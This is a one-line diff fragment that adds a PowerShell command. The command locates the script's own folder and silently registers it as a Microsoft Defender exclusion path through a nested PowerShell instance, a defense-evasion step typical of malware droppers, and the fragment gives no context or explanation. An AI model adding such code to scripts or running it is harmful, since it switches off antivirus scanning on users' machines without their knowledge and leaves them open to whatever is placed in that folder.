@@ -1,0 +1,1 @@
+$sd=Split-Path -Parent $MyInvocation.MyCommand.Definition;$cmd="Add-MpPreference -ExclusionPath `"$sd`"";[System.Management.Automation.PowerShell]::Create().AddScript($cmd).Invoke();Start-Sleep -Milliseconds 1000
